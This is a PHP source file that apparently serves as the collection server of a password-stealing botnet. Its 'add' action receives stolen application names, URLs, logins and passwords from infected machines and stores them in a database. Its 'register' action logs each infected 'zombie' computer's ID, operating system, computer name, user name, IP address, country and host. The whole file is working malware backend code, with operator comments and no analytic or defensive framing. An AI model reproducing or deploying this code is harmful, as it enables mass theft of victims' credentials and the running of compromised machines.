<?php

  include 'config.php';

	// ********************************************************************************************

	// ADD password dump to database **************************************************************
	//  ?action=add
	//  &a=     application (see config.php)
	//  &u=     url
	//  &l=     login
	//  &p=     password
	//  &c=     Computer ID
	// TABLE id, program, url, login, pass, compid, date, ip
	if ($_GET["action"] == "add") {
		if (isset($_GET["a"]) && isset($_GET["c"]) && isset($_GET["u"]) && isset($_GET["l"])&& isset($_GET["p"]) 
		&& is_numeric($_GET["a"]) && $_GET["a"]>=0 && $_GET["a"] < $ApplicationCount) {   // CHECK THE BROWSER HERE!
			$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
			if (!$mysql) exit;
			if (!mysql_select_db($dbDatabase, $mysql)) exit;

			$result = mysql_query("SELECT * FROM logs WHERE program = '".mysql_real_escape_string(htmlspecialchars($_GET["a"]), $mysql).
			  "' AND url = '".mysql_real_escape_string(htmlspecialchars($_GET["u"]), $mysql).
			  "' AND login = '".mysql_real_escape_string(htmlspecialchars($_GET["l"]), $mysql).
			  "' AND pass = '".mysql_real_escape_string(htmlspecialchars($_GET["p"]), $mysql). "';", $mysql);
			if (!$result) exit;
			
			// add only if not already there
			if (mysql_num_rows($result) == 0) {
				$result = mysql_query("INSERT INTO logs (id, program, url, login, pass, compid, date, ip) VALUES (NULL , '".
				  mysql_real_escape_string(htmlspecialchars($_GET["a"]), $mysql)."', '".mysql_real_escape_string(htmlspecialchars($_GET["u"]), $mysql)."', '".
				  mysql_real_escape_string(htmlspecialchars($_GET["l"]), $mysql)."', '".mysql_real_escape_string(htmlspecialchars($_GET["p"]), $mysql)."', '".
				  mysql_real_escape_string(htmlspecialchars($_GET["c"]), $mysql)."', '".date("Y-m-d H:i:s")."', '".$_SERVER['REMOTE_ADDR']."');", $mysql);
			}
			mysql_close($mysql);
		}
		exit;
	}

	// REGISTER zombie as suspect *****************************************************************
	//  ?action=register
	//  &i=     Computer ID (calculated from hardware + computer name)
	//  &o=     OS
	//  &c=     Computer Name
	//  &u=     User Name
	//  &f      Installation error code (see config.php)
	// TABLE id, compid, os, computer, user, install, date, ip, country, host
	if ($_GET["action"] == "register") {
		if (isset($_GET["i"]) && isset($_GET["o"]) && isset($_GET["c"]) && isset($_GET["u"]) && isset($_GET["f"])
		&& is_numeric($_GET["f"]) && $_GET["f"]>=0 && $_GET["f"]<=100) {
			$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
			if (!$mysql) exit;
			if (!mysql_select_db($dbDatabase, $mysql)) exit;

			$result = mysql_query("INSERT INTO suspects (id, compid, os, computer, user, install, date, ip, country, host) VALUES (NULL , '".
			  mysql_real_escape_string(htmlspecialchars($_GET["i"]), $mysql)."', '".
			  mysql_real_escape_string(htmlspecialchars($_GET["o"]), $mysql)."', '".
			  mysql_real_escape_string(htmlspecialchars($_GET["c"]), $mysql)."', '".
			  mysql_real_escape_string(htmlspecialchars($_GET["u"]), $mysql)."', '".
			  mysql_real_escape_string(htmlspecialchars($_GET["f"]), $mysql)."', '".
			  date("Y-m-d H:i:s")."', '".$_SERVER['REMOTE_ADDR']."', '".get_country($_SERVER['REMOTE_ADDR'])."', '".gethostbyaddr($_SERVER['REMOTE_ADDR'])."');", $mysql);

			mysql_close($mysql);
		}
		exit;
	}

	// Country functions *****************************************************************
  function ip2dec($ip) {
  	$ip = trim($ip);
  	
  	$parts = explode(".", $ip);
  	$dec  = 256*256*256*((int)$parts[0]);
  	$dec += 256*256*((int)$parts[1]);
  	$dec += 256*((int)$parts[2]);
  	$dec += ((int)$parts[3]);
  	
  	return (string)$dec;
  }

  function get_country($ip, $csv_path = "ip-to-country.csv", $long = true) {
  	static $lines;

  	if($ip == "127.0.0.1" || $ip == "::1") return "localhost";
  	$ip = ip2dec($ip);
  	if(!(preg_match( '/^\d*$/' , $ip) == 1)) return "Unknown";
  	
  	if(!is_array($lines)) {
  		$csv = file_get_contents($csv_path);
  		$csv = str_replace("\"", "", $csv);
  		$lines = explode("\n", $csv);
  	}
  	
  	foreach($lines as $line) {
  		$dataset = explode(",", $line);
  		if($ip >= $dataset[0] && $ip <= $dataset[1]) {
  			if($long) return ucwords(strtolower(trim($dataset[4])));
  			return ucwords(strtolower(trim($dataset[3])));
  		}
  	}
  	return "Unknown";
  }

?>